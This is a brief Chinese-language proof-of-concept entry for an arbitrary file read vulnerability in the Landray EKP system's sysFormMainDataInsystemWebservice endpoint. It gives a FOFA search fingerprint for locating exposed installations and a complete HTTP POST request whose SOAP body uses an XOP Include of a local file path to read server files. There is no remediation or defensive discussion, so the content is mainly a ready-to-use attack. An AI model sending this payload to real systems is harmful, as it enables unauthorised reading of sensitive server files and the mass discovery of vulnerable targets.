# 蓝凌EKP系统接口sysFormMainDataInsystemWebservice存在任意文件读取漏洞

蓝凌EKP系统接口sysFormMainDataInsystemWebservice存在任意文件读取漏洞

## fofa

```javascript
body="Com_Parameter"
```

## poc

```javascript
POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getData>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getData>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

![image-20241218110643116](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412181106199.png)

